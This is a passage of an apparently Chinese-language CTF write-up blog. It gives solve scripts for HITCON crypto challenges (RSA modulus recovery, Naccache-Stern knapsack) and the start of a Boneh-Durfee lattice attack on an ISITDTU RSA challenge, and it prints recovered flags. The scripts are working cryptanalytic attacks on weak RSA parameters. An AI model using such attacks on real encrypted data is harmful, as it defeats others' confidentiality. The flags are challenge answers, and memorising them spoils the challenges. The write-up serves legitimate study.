class="number">3</span>,e):</span><br><span class="line">    <span class="keyword">if</span>(kphi%k==<span class="number">0</span>):</span><br><span class="line">        phi = kphi//k</span><br><span class="line">        <span class="keyword">if</span>(gcd(e,phi)==<span class="number">1</span>):</span><br><span class="line">            phis.append(phi)</span><br><span class="line"><span class="comment"># print(len(phis)) # 923</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Then use</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> phis:</span><br><span class="line">    a = (x-<span class="number">1</span>)</span><br><span class="line">    b = (x*y-<span class="number">1</span>-phi+(x-<span class="number">1</span>)*(y-<span class="number">1</span>))</span><br><span class="line">    cc = (y-<span class="number">1</span>)*(x*y-<span class="number">1</span>)</span><br><span class="line">    delta = b*b-<span class="number">4</span>*a*cc</span><br><span class="line">    <span class="keyword">if</span>(iroot(delta,<span class="number">2</span>)[<span class="number">1</span>]==<span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(phi)</span><br><span class="line">        k1 = (-b+iroot(delta,<span class="number">2</span>)[<span class="number">0</span>])//(<span class="number">2</span>*a)</span><br><span class="line">        k2 = (-b-iroot(delta,<span class="number">2</span>)[<span class="number">0</span>])//(<span class="number">2</span>*a)</span><br><span class="line">        <span class="built_in">print</span>(k1,k2)</span><br><span class="line"></span><br><span class="line">phi  = <span class="number">22509077260984027608263845908083202879597081619164800783060781115945741547031252889863077300004310236160814653393991988068104999928735140821504649764471313283345921984799288521496479399032837319974588038186917872597078510975400908137738190304700710900604891709265153418588830065918981914371070605822998222526936764035473024951172438654405051015158373989943636215751206002298354662255322404681649160859586893385153685796114347024559211776931935054744445492193990127160520676232531227390204623950157430966169435920800794748331292066769479560454753704770229274680560878024797177827265072368595931697411659251440631501728</span></span><br><span class="line">k1 = <span class="number">28208949439955302309848635580625081491778513331790561038922122543347871461021445160004265905257374948095564180270338913034580463560285897071083488435445872411686139458980129711508020003449180850634252661246277255619651792037014931213229280933988207275950107375275346841229515570544044065150714741967440182598</span></span><br><span class="line">q = y+k1</span><br><span class="line"><span class="keyword">assert</span> isPrime(q)</span><br><span class="line">p = phi//(q-<span class="number">1</span>)+<span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># hitcon&#123;1t_is_50_easy_t0_find_th3_modulus_back@@!!@!@!@@!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Very-Simple-Haskell"><a href="#Very-Simple-Haskell" class="headerlink" title="Very Simple Haskell"></a>Very Simple Haskell</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.Char</span><br><span class="line"><span class="keyword">import</span> System.IO</span><br><span class="line"></span><br><span class="line"><span class="title">n</span> :: <span class="type">Integer</span></span><br><span class="line"><span class="title">n</span> = <span class="number">134896036104102133446208954973118530800743044711419303630456535295204304771800100892609593430702833309387082353959992161865438523195671760946142657809228938824313865760630832980160727407084204864544706387890655083179518455155520501821681606874346463698215916627632418223019328444607858743434475109717014763667</span></span><br><span class="line"></span><br><span class="line"><span class="title">k</span> :: <span class="type">Int</span></span><br><span class="line"><span class="title">k</span> = <span class="number">131</span></span><br><span class="line"></span><br><span class="line"><span class="title">primes</span> :: [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">primes</span> = take k $ sieve (<span class="number">2</span> : [<span class="number">3</span>, <span class="number">5</span>..])</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    sieve (p:xs) = p : sieve [x|x &lt;- xs, x `mod` p &gt; <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="title">stringToInteger</span> :: <span class="type">String</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">stringToInteger</span> str = foldl (\x y -&gt; (toInteger $ ord y) + x*<span class="number">256</span>) <span class="number">0</span> str</span><br><span class="line"></span><br><span class="line"><span class="title">integerToString</span> :: <span class="type">Integer</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">integerToString</span> num = f num <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        f <span class="number">0</span> str = str</span><br><span class="line">        f num str = f (div num <span class="number">256</span>) $ (:) (chr $ fromIntegral $ num `mod` <span class="number">256</span>) str</span><br><span class="line"></span><br><span class="line"><span class="title">numToBits</span> :: <span class="type">Integer</span> -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">numToBits</span> num = f num []</span><br><span class="line">    <span class="keyword">where</span> </span><br><span class="line">        f <span class="number">0</span> arr = arr</span><br><span class="line">        f x arr = f (div x <span class="number">2</span>) ((fromInteger $ x `mod` <span class="number">2</span>) : arr)</span><br><span class="line"></span><br><span class="line"><span class="title">extendBits</span> :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>] -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">extendBits</span> blockLen arr</span><br><span class="line">    | len == <span class="number">0</span> = arr</span><br><span class="line">    | len &gt; <span class="number">0</span> = (replicate (blockLen-len) <span class="number">0</span>) ++ arr</span><br><span class="line">    <span class="keyword">where</span> len = (length arr) `mod` blockLen</span><br><span class="line"></span><br><span class="line"><span class="title">calc</span> :: <span class="type">Integer</span> -&gt; [<span class="type">Int</span>] -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">calc</span> num [] = num</span><br><span class="line"><span class="title">calc</span> num arr = calc result restArr</span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        num2 = num*num `mod` n</span><br><span class="line">        (block, restArr) = splitAt k arr</span><br><span class="line">        zipped = zipWith (\x y -&gt; ((fromIntegral x)*y) `mod` n) block primes  </span><br><span class="line">        mul = product $ filter (/=<span class="number">0</span>) zipped</span><br><span class="line">        result = num2*mul `mod` n</span><br><span class="line"></span><br><span class="line"><span class="title">magic</span> :: <span class="type">String</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">magic</span> input = result</span><br><span class="line">    <span class="keyword">where</span> </span><br><span class="line">        num = stringToInteger input</span><br><span class="line">        bits = numToBits num</span><br><span class="line">        extended = reverse $ extendBits <span class="number">8</span> bits</span><br><span class="line">        oriLen = length extended</span><br><span class="line">        extendedBits = extendBits k extended</span><br><span class="line">        oriLenBits = numToBits $ fromIntegral oriLen</span><br><span class="line">        extendedOriLenBits = extendBits k oriLenBits</span><br><span class="line">        finalBits = extendedOriLenBits ++ extendedBits</span><br><span class="line">        result = show $ calc <span class="number">1</span> (reverse finalBits)</span><br><span class="line"></span><br><span class="line"><span class="title">main</span> = <span class="keyword">do</span></span><br><span class="line">    flag &lt;- readFile <span class="string">&quot;flag&quot;</span></span><br><span class="line">    putStrLn.show $ length flag</span><br><span class="line">    putStrLn $ magic (<span class="string">&quot;the flag is hitcon&#123;&quot;</span> ++ flag ++ <span class="string">&quot;&#125;&quot;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">84329776255618646348016649734028295037597157542985867506958273359305624184282146866144159754298613694885173220275408231387000884549683819822991588176788392625802461171856762214917805903544785532328453620624644896107723229373581460638987146506975123149045044762903664396325969329482406959546962473688947985096</span><br></pre></td></tr></table></figure><p>AI将haskell转成python代码 是一个 Naccache-Stern Knapsack Cryptosystem<br><a href="https://eprint.iacr.org/2017/421.pdf" target="_balnk">here</a><br>emm 先放这 以后再来看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">primes=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,<span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,<span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,<span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,<span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,<span class="number">991</span>,<span class="number">997</span>]</span><br><span class="line">n = <span class="number">134896036104102133446208954973118530800743044711419303630456535295204304771800100892609593430702833309387082353959992161865438523195671760946142657809228938824313865760630832980160727407084204864544706387890655083179518455155520501821681606874346463698215916627632418223019328444607858743434475109717014763667</span></span><br><span class="line"></span><br><span class="line">enc=<span class="number">84329776255618646348016649734028295037597157542985867506958273359305624184282146866144159754298613694885173220275408231387000884549683819822991588176788392625802461171856762214917805903544785532328453620624644896107723229373581460638987146506975123149045044762903664396325969329482406959546962473688947985096</span></span><br><span class="line">bit2int = <span class="keyword">lambda</span> x: <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, x)), <span class="number">2</span>)</span><br><span class="line">m = <span class="number">129105988525739869308153101831605950072860268575706582195774923614094296354415364173823406181109200888049609207238266506466864447780824680862439187440797565555486108716502098901182492654356397840996322893263870349262138909453630565384869193972124927953237311411285678188486737576555535085444384901167109670365</span></span><br><span class="line">z = enc * libnum.invmod(m, n) % n</span><br><span class="line">bits = [(z % p == <span class="number">0</span>) * <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> primes]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>*<span class="number">20</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(bit2int(bits[<span class="number">5</span>:][i:i+<span class="number">8</span>])))</span><br></pre></td></tr></table></figure><h1 id="ISITDTU2019"><a href="#ISITDTU2019" class="headerlink" title="ISITDTU2019"></a>ISITDTU2019</h1><h2 id="Easy-RSA-1"><a href="#Easy-RSA-1" class="headerlink" title="Easy_RSA_1"></a>Easy_RSA_1</h2><p>题目给了n,e,c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = 137709853388874260067664060306224801065880567280896538344708662296491187670268243771581008615887329285442080267493172576517227603581814922784005894668293664250883858847270414696279127204843462302026428548409668060539273696154323753582118715764251826181439387752900169898505518594134423187783089073450520527969</span><br><span class="line">e = 85605944479801539190292577400294315989703364683792339737453887619652946907819548388390076584246192710348319524405250340541547224543819349494488596679810310694697763188201375896240755682682520811114377302206659716598003967368992125832908158096663258971132148617761060030524535044970322206572134828548118438019</span><br><span class="line">c = 22066874366908131522623165919721031154048372827959879486746669804284618882326621205522887800063326155288431192110879403482210420111408801477749097399368616494107231276644736023482237804800287810317122448198973027350599454646050497733117161743355379588761228932055556016302337519814538743706899009493572298224</span><br></pre></td></tr></table></figure><p>可以发现这里n(1024)和e(1023)的bit数差的很小<br>这里学习到一手 <code>Boneh-Durfee-Attack</code> 这个攻击的适用条件比维纳攻击宽一点<br>满足 d &lt; N^0.292 时可以使用<br>直接套模板了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct</span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this</span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions</span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 